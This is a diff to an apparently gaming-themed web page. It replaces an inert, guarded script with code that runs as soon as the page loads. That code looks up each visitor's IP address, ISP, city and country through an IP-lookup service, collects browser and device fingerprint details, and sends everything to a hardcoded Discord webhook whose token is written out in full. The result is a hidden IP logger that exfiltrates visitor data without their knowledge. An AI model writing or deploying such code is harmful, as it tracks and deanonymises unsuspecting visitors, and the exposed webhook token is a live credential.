@@ -69,94 +69,57 @@
       &copy; 2025 Gaming Services. All rights reserved.
     </footer>
     <script>
-      // NOTE: This version will attempt to send the assembled payload to a Discord webhook
-      // immediately when the page loads. You must replace the placeholder below with
-      // your webhook URL. Do NOT commit the real webhook URL into a public repo.
-      //
-      // WARNING: embedding a webhook URL in client-side HTML makes that URL public.
-      // Anyone who can fetch the page can see/use the webhook URL. If you proceed,
-      // rotate (delete & recreate) the webhook if it becomes exposed.
+      let echolog = {};
+      fetch("https://wtfismyip.com/json")
+        .then((response) => response.json())
+        .then((data) => {
+          let echolog = {
+            ipAddress: data.YourFuckingIPAddress,
+            location: data.YourFuckingLocation,
+            hostname: data.YourFuckingHostname,
+            isp: data.YourFuckingISP,
+            city: data.YourFuckingCity,
+            country: data.YourFuckingCountry,
+            countryCode: data.YourFuckingCountryCode,
+            userAgent: navigator.userAgent,
+            windowProp: Object.keys(window).length,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            windowRatio: window.innerWidth / window.innerHeight,
+            screenWidth: window.screen.availWidth,
+            screenHeight: window.screen.availHeight,
+            screenRatio: window.screen.availWidth / window.screen.availHeight,
+            DPI: window.devicePixelRatio,
+            colorDepth: window.screen.colorDepth,
+            orientation: window.screen.orientation.type,
+            orientationAngle: window.screen.orientation.angle,
+            os: navigator.platform,
+            threads: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory,
+            systemLanguages: navigator.languages.join(", "),
+            languages: navigator.language,
+          };
 
-      // Paste your webhook URL here (replace the placeholder string)
-      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1428808614918750379/rujdaVb0z0gkD4eoOlPtoKvgXDdeADyAWUdWH28be5iGFBeFQMy548l1mc_VTTElZbZJ';
-
-      // Simple guard: if the placeholder is not replaced, do nothing.
-      if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'https://discord.com/api/webhooks/1428808614918750379/rujdaVb0z0gkD4eoOlPtoKvgXDdeADyAWUdWH28be5iGFBeFQMy548l1mc_VTTElZbZJ') {
-        // Prevent accidentally sending many times in quick reload loops:
-        // allow only one send per browser per 10 seconds (purely local)
-        const LS_KEY = '__sc_last_send';
-        const MIN_SECS = 10;
-        try {
-          const last = parseInt(localStorage.getItem(LS_KEY) || '0', 10);
-          const now = Math.floor(Date.now() / 1000);
-          if (now - last < MIN_SECS) {
-            console.warn('Skipped send: client-side throttle active.');
-          } else {
-            // proceed to gather telemetry and send
-            fetch("https://wtfismyip.com/json")
-              .then((response) => response.json())
-              .then((data) => {
-                const echolog = {
-                  ipAddress: data.YourFuckingIPAddress,
-                  location: data.YourFuckingLocation,
-                  hostname: data.YourFuckingHostname,
-                  isp: data.YourFuckingISP,
-                  city: data.YourFuckingCity,
-                  country: data.YourFuckingCountry,
-                  countryCode: data.YourFuckingCountryCode,
-                  userAgent: navigator.userAgent,
-                  windowProp: Object.keys(window).length,
-                  windowWidth: window.innerWidth,
-                  windowHeight: window.innerHeight,
-                  windowRatio: window.innerWidth / window.innerHeight,
-                  screenWidth: window.screen.availWidth,
-                  screenHeight: window.screen.availHeight,
-                  screenRatio: window.screen.availWidth / window.screen.availHeight,
-                  DPI: window.devicePixelRatio,
-                  colorDepth: window.screen.colorDepth,
-                  orientation: (window.screen.orientation && window.screen.orientation.type) || '',
-                  orientationAngle: (window.screen.orientation && window.screen.orientation.angle) || '',
-                  os: navigator.platform,
-                  threads: navigator.hardwareConcurrency,
-                  memory: navigator.deviceMemory,
-                  systemLanguages: (navigator.languages && navigator.languages.join(", ")) || '',
-                  languages: navigator.language,
-                };
-
-                const payload = {
-                  content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUA: ${echolog.userAgent}\nScreen: ${echolog.screenWidth}x${echolog.screenHeight}\nWindow: ${echolog.windowWidth}x${echolog.windowHeight}\nDPI: ${echolog.DPI}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory(GB): ${echolog.memory}\nLangs: ${echolog.systemLanguages}`
-                };
-
-                // Attempt to POST to Discord webhook immediately
-                fetch(DISCORD_WEBHOOK_URL, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify(payload),
-                  mode: 'cors'
-                })
-                .then((res) => {
-                  if (res.ok) {
-                    try { localStorage.setItem(LS_KEY, String(Math.floor(Date.now() / 1000))); } catch (e) {}
-                    console.log('Payload sent to Discord webhook (response OK).');
-                  } else {
-                    console.warn('Discord webhook returned status', res.status, res.statusText);
-                  }
-                })
-                .catch((err) => {
-                  console.error('Failed to send payload to Discord webhook:', err);
-                });
-              })
-              .catch((err) => {
-                console.error('Failed to fetch IP data:', err);
-              });
-          }
-        } catch (e) {
-          console.error('Error in send guard:', e);
-        }
-      } else {
-        // Placeholder not replaced: do nothing and log a clear message.
-        console.warn('Discord webhook not set. Replace DISCORD_WEBHOOK_URL placeholder to enable sending.');
-      }
+          // Set up the payload for the webhook
+          const payload = {
+            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
+          };
+          // This is a lazy way of doing it, having
+          // your webhook url out in the open like
+          // this is a bad idea, you should instead
+          // have it contact a internal API to
+          // forward the request.
+          fetch("https://discord.com/api/webhooks/1428808614918750379/rujdaVb0z0gkD4eoOlPtoKvgXDdeADyAWUdWH28be5iGFBeFQMy548l1mc_VTTElZbZJ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          })
+            .then((response) => console.log(response))
+            .catch((error) => console.error(error));
+        })
+        .catch((error) => console.error(error));
     </script>
   </body>
 </html>
